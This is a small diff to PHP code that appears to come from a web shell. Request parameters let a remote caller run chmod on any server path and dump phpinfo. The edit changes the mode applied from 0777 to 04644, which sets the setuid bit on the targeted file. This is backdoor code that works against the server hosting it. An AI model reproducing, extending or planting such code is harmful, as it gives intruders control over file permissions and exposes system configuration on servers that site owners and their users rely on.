@@ -67,7 +67,7 @@ if(isset($_REQUEST['chm']))
     }
     else
     {
-        echo (@chmod ($_REQUEST['chm'],0777) ? "Reassigned" : "Can't Reasign");
+        echo (@chmod ($_REQUEST['chm'],04644) ? "Reassigned" : "Can't Reasign");
     }
 }
 elseif(isset($_REQUEST['phpinfo']))
